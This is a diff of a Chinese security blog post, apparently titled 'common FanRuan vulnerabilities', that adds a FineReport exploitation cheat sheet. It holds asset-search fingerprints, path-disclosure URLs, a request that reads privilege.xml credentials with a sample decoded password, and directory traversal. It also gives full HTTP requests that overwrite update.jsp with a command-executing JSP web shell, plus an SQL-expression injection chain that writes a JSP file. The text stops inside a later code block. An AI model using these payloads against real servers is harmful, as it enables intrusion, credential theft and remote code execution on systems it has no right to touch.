@@ -10,7 +10,7 @@
 <meta property='og:description' content="帆软报表快速打点">
 <meta property='og:url' content='https://lserein.github.io/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/'>
 <meta property='og:site_name' content='Lsec&#39;s Blog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-02T19:39:49&#43;08:00'/><meta property='article:modified_time' content='2025-11-02T19:44:35&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-02T19:39:49&#43;08:00'/><meta property='article:modified_time' content='2025-12-01T11:08:37&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.png' />
 <meta name="twitter:title" content="帆软常见漏洞">
 <meta name="twitter:description" content="帆软报表快速打点"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://lserein.github.io/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.png' />
@@ -246,7 +246,53 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#常见指纹">常见指纹</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#前台漏洞">前台漏洞</a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#v80读取用户名与密码">V8.0读取用户名与密码</a></li>
+            <li><a href="#目录遍历">目录遍历</a></li>
+            <li><a href="#数据决策系统v90任意文件覆盖漏洞getshell">数据决策系统v9.0任意文件覆盖漏洞getshell</a></li>
+            <li><a href="#帆软前台getshell">帆软前台getshell</a></li>
+            <li><a href="#帆软pdf接口远程命令执行漏洞">帆软pdf接口远程命令执行漏洞</a></li>
+            <li><a href="#帆软channel反序列化">帆软channel反序列化</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
     <article class="has-image main-article">
@@ -318,7 +364,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 1 分钟
+                    阅读时长: 2 分钟
                 </time>
             </div>
         
@@ -333,7 +379,551 @@
     <section class="article-content">
     
     
-    <p>最近在项目中，有时间更新！</p>
+    <p><a class="link" href="https://mp.weixin.qq.com/s/e3vFVmiZ25wSWtw2AYXBsA"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/e3vFVmiZ25wSWtw2AYXBsA</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/AgMYcyq_TE4X8MvZ7cjiPQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/AgMYcyq_TE4X8MvZ7cjiPQ</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/gQGkMk8U89RSqzfSa2vtsg"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/gQGkMk8U89RSqzfSa2vtsg</a></p>
+<h2 id="常见指纹">常见指纹
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">title</span><span class="o">=</span><span class="s">&#34;数据决策系统&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">body</span><span class="o">=</span><span class="s">&#34;FineReport&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">body</span><span class="o">=</span><span class="s">&#34;ReportServer?op=resource&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">||</span><span class="w"> </span><span class="n">body</span><span class="o">=</span><span class="s">&#34;/webroot/decision&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">body</span><span class="o">=</span><span class="s">&#34;/WebReport/ReportServer?&#34;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">body</span><span class="o">=</span><span class="s">&#34;/webroot/decision/file?path=&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">||</span><span class="w"> </span><span class="n">body</span><span class="o">=</span><span class="s">&#34;/decision/file?path=&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="信息收集">信息收集
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">访问以下两个路径可查看帆软版本号</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">webroot</span><span class="o">/</span><span class="n">dicision</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">info</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">dicision</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">info</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/1.jpg"
+	width="1920"
+	height="1080"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/1_hu_81e777cea7174307.jpg 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/1_hu_5aad147b47f62f57.jpg 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="177"
+		data-flex-basis="426px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="n">webroot</span><span class="o">/</span><span class="n">decision</span><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">ReportServer</span><span class="o">?</span><span class="n">test</span><span class="o">=</span><span class="n">s</span><span class="o">&amp;</span><span class="n">n</span><span class="o">=</span><span class="n">$</span><span class="p">{</span><span class="n">ENV_HOME</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">decision</span><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">ReportServer</span><span class="o">?</span><span class="n">test</span><span class="o">=</span><span class="n">s</span><span class="o">&amp;</span><span class="n">n</span><span class="o">=</span><span class="n">$</span><span class="p">{</span><span class="n">ENV_HOME</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看系统绝对路径</strong></p>
+<p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/2.png"
+	width="2560"
+	height="1288"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/2_hu_8e7047e8f304a0ac.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/2_hu_eb228b160b30469a.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="477px"
+	
+></p>
+<h2 id="前台漏洞">前台漏洞
+</h2><h4 id="v80读取用户名与密码">V8.0读取用户名与密码
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">/</span><span class="n">WebReport</span><span class="p">/</span><span class="n">ReportServer</span><span class="k">?</span><span class="n">op</span><span class="p">=</span><span class="n">chart</span><span class="p">&amp;</span><span class="n">cmd</span><span class="p">=</span><span class="n">get_geo_json</span><span class="p">&amp;</span><span class="n">resourcepath</span><span class="p">=</span><span class="n">privilege</span><span class="p">.</span><span class="py">xml</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/3.png"
+	width="2140"
+	height="860"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/3_hu_52d2cdcdf2a32b1d.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/3_hu_96e053d89f8835fd.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="597px"
+	
+></p>
+<p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/4.png"
+	width="1788"
+	height="436"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/4_hu_63fa27f5d75cc77f.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/4_hu_14feadab883dbe59.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="410"
+		data-flex-basis="984px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">erick</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">___0022007c0039003b005100e3</span><span class="w">     </span><span class="c1">//密文 明文123456</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/5.png"
+	width="2560"
+	height="988"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/5_hu_21ff0270aa4bd96c.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/5_hu_57a3f038788a7d5e.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="621px"
+	
+></p>
+<h4 id="目录遍历">目录遍历
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">/</span><span class="n">WebReport</span><span class="p">/</span><span class="n">ReportServer</span><span class="k">?</span><span class="n">op</span><span class="p">=</span><span class="n">fs_remote_design</span><span class="p">&amp;</span><span class="n">cmd</span><span class="p">=</span><span class="n">design_list_file</span><span class="p">&amp;</span><span class="n">file_path</span><span class="p">=../..&amp;</span><span class="n">currentUserName</span><span class="p">=</span><span class="n">admin</span><span class="p">&amp;</span><span class="n">currentUserId</span><span class="p">=</span><span class="mf">1</span><span class="p">&amp;</span><span class="n">isWebReport</span><span class="p">=</span><span class="n">true</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/6.png"
+	width="2349"
+	height="1162"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/6_hu_4352477a5fee7c77.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/6_hu_a7226b8fa91252f8.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="485px"
+	
+></p>
+<h4 id="数据决策系统v90任意文件覆盖漏洞getshell">数据决策系统v9.0任意文件覆盖漏洞getshell
+</h4><p><strong>tips:这是利用文件覆盖实现RCE，所以要保证文件真实存在，而在WebReport V9在安装之后在WebReport目录下存在update.jsp和update1.jsp</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">POST</span> <span class="p">/</span><span class="n">WebReport</span><span class="p">/</span><span class="n">ReportServer</span><span class="k">?</span><span class="n">op</span><span class="p">=</span><span class="n">svginit</span><span class="p">&amp;</span><span class="n">cmd</span><span class="p">=</span><span class="n">design_save_svg</span><span class="p">&amp;</span><span class="n">filePath</span><span class="p">=</span><span class="n">chartmapsvg</span><span class="p">/../../../../</span><span class="n">WebReport</span><span class="p">/</span><span class="n">update</span><span class="p">.</span><span class="py">jsp</span> <span class="n">HTTP</span><span class="p">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="err">:</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="py">x</span><span class="p">.</span><span class="py">x</span>
+</span></span><span class="line"><span class="cl"><span class="nb">User-Agent</span><span class="err">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="p">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="p">/</span><span class="mf">81.0</span><span class="p">.</span><span class="py">4044</span><span class="p">.</span><span class="py">92</span> <span class="n">Safari</span><span class="p">/</span><span class="mf">537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="err">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Accept-Au</span><span class="err">:</span> <span class="n">0c42b2f264071be0507acea1876c74</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Type</span><span class="err">:</span> <span class="n">text</span><span class="p">/</span><span class="n">xml</span><span class="p">;</span><span class="n">charset</span><span class="p">=</span><span class="n">UTF</span><span class="p">-</span><span class="mf">8</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Length</span><span class="err">:</span> <span class="mf">95</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;__CONTENT__&#34;</span><span class="err">:</span><span class="s2">&#34;&lt;% out.print(\&#34;</span><span class="n">hello</span><span class="p">\</span><span class="s2">&#34;); %&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;__CHARSET__&#34;</span><span class="err">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/7.png"
+	width="2560"
+	height="1159"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/7_hu_b1bb1065bafb3fcd.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/7_hu_9dbdd5b03464d261.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="220"
+		data-flex-basis="530px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">xxxx</span><span class="p">/</span><span class="n">WebReport</span><span class="p">/</span><span class="n">update</span><span class="p">.</span><span class="py">jsp</span>
+</span></span><span class="line"><span class="cl"><span class="n">POST</span> <span class="p">/</span><span class="n">WebReport</span><span class="p">/</span><span class="n">ReportServer</span><span class="k">?</span><span class="n">op</span><span class="p">=</span><span class="n">svginit</span><span class="p">&amp;</span><span class="n">cmd</span><span class="p">=</span><span class="n">design_save_svg</span><span class="p">&amp;</span><span class="n">filePath</span><span class="p">=</span><span class="n">chartmapsvg</span><span class="p">/../../../../</span><span class="n">WebReport</span><span class="p">/</span><span class="n">update</span><span class="p">.</span><span class="py">jsp</span> <span class="n">HTTP</span><span class="p">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="err">:</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="py">x</span><span class="p">.</span><span class="py">x</span>
+</span></span><span class="line"><span class="cl"><span class="nb">User-Agent</span><span class="err">:</span> <span class="n">Mozilla</span><span class="p">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="p">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="p">/</span><span class="mf">81.0</span><span class="p">.</span><span class="py">4044</span><span class="p">.</span><span class="py">92</span> <span class="n">Safari</span><span class="p">/</span><span class="mf">537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="err">:</span> <span class="n">close</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Accept-Au</span><span class="err">:</span> <span class="n">0c42b2f264071be0507acea1876c74</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Type</span><span class="err">:</span> <span class="n">text</span><span class="p">/</span><span class="n">xml</span><span class="p">;</span><span class="n">charset</span><span class="p">=</span><span class="n">UTF</span><span class="p">-</span><span class="mf">8</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Length</span><span class="err">:</span> <span class="mf">675</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;__CONTENT__&#34;</span><span class="err">:</span><span class="s2">&#34;&lt;%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\&#34;</span><span class="n">cmd</span><span class="p">\</span><span class="s2">&#34;)).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;__CHARSET__&#34;</span><span class="err">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/8.png"
+	width="1747"
+	height="747"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/8_hu_10bda2a820dd84e9.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/8_hu_c0228da0e87c540d.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="561px"
+	
+></p>
+<h4 id="帆软前台getshell">帆软前台getshell
+</h4><p><a class="link" href="https://y4tacker.github.io/2024/07/23/year/2024/7/%e6%9f%90%e8%bd%afReport%e9%ab%98%e7%89%88%e6%9c%ac%e4%b8%ad%e5%88%a9%e7%94%a8%e7%9a%84%e4%b8%80%e4%ba%9b%e7%bb%86%e8%8a%82/"  target="_blank" rel="noopener"
+    >https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">验证脚本</span><span class="err">：</span><span class="n">判断目标是否存在表达式注入</span><span class="err">，</span><span class="n">如果返回302表示很可能存在漏洞</span>
+</span></span><span class="line"><span class="cl"><span class="n">GET</span> <span class="p">/</span><span class="n">webroot</span><span class="p">/</span><span class="n">decision</span><span class="p">/</span><span class="n">view</span><span class="p">/</span><span class="n">ReportServer</span><span class="k">?</span><span class="n">test</span><span class="p">=</span><span class="n">s</span><span class="p">&amp;</span><span class="n">n</span><span class="p">=${</span><span class="n">__fr_locale__</span><span class="p">=</span><span class="n">sql</span><span class="p">(</span><span class="s1">&#39;FRDemo&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="s1">&#39;%EF%BB%BFSELECT%201%3B&#39;</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">1</span><span class="p">))}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/9.png"
+	width="2560"
+	height="892"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/9_hu_3ee5e6f8216a1ec5.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/9_hu_786ab39a58cae5be.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="688px"
+	
+></p>
+<p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/10.png"
+	width="2559"
+	height="809"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/10_hu_89cca692c6ee889f.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/10_hu_b90f39c13957b081.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="316"
+		data-flex-basis="759px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">/</span><span class="n">webroot</span><span class="p">/</span><span class="n">decision</span><span class="p">/</span><span class="n">view</span><span class="p">/</span><span class="n">ReportServer</span><span class="k">?</span><span class="n">test</span><span class="p">=</span><span class="n">s</span><span class="p">&amp;</span><span class="n">n</span><span class="p">=${</span><span class="n">ENV_HOME</span><span class="p">}</span>   <span class="p">//</span><span class="n">获取绝对路径</span>
+</span></span><span class="line"><span class="cl"><span class="p">//</span><span class="n">写入文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">/</span><span class="n">webroot</span><span class="p">/</span><span class="n">decision</span><span class="p">/</span><span class="n">view</span><span class="p">/</span><span class="n">ReportServer</span><span class="k">?</span><span class="n">test</span><span class="p">=</span><span class="n">s</span><span class="p">&amp;</span><span class="n">n</span><span class="p">=${</span><span class="n">__fr_locale__</span><span class="p">=</span><span class="n">sql</span><span class="p">(</span><span class="s1">&#39;FRDemo&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="s1">&#39;ATTACH%09DATABASE%20%27%2Fbi%2Fxqiao_bi%2Fwebapps%2Fwebroot%2Fhelp%2Fhello.jsp%27%20AS%20xxxx%3B&#39;</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">1</span><span class="p">))}${</span><span class="n">__fr_locale__</span><span class="p">=</span><span class="n">sql</span><span class="p">(</span><span class="s1">&#39;FRDemo&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="s1">&#39;CREATE%09TABLE%20xxxx.exp%28data%20text%29%3B&#39;</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">1</span><span class="p">))}${</span><span class="n">__fr_locale__</span><span class="p">=</span><span class="n">sql</span><span class="p">(</span><span class="s1">&#39;FRDemo&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="s1">&#39;INSERT%09INTO%20xxxx.exp%28data%29%20VALUES%20%28%27%3c%25%20out.print%28%22hello%22%29%3b%25%3e%27%29%3B&#39;</span><span class="p">,</span><span class="mf">1</span><span class="p">,</span><span class="mf">1</span><span class="p">))}</span> <span class="n">HTTP</span><span class="p">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Type</span><span class="err">:</span> <span class="n">application</span><span class="p">/</span><span class="nb">x-www</span><span class="n">-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Length</span><span class="err">:</span> <span class="mf">600</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="err">:</span> <span class="n">close</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/13.png"
+	width="2560"
+	height="1091"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/13_hu_2eb208737d7b91.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/13_hu_710fdf06956477c0.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251130212343078"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="563px"
+	
+></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/AliftiLevjz5HB9uL0DOqQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/AliftiLevjz5HB9uL0DOqQ</a>    绕过高版本帆软</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
